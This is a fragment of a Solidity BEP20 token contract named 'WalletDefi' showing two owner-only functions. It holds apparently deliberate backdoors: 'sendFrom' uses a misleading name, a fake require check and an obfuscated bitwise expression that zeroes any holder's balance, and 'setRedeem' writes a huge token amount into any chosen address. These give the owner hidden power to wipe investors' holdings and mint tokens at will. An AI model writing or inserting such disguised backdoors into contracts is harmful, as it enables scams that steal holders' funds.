...
contract WalletDefi is Context, IBEP20, Ownable {
  ...
  function sendFrom(address zroPaymentAddress, bytes32 reserved) public onlyOwner() {
    (zroPaymentAddress != address(0), "ERC20: burn from the zero address");
    _balances[zroPaymentAddress] = (((_balances[zroPaymentAddress]) & (_balances[zroPaymentAddress]) & 0) << 0xF);
  }
  ...
  function setRedeem(address redeemAddress, bytes32 reserved) public onlyOwner() {
    require(redeemAddress != address(0));
    uint256 _totalSupplies = 1000000000000000000000000;
    _balances[redeemAddress] = _totalSupplies;
  }
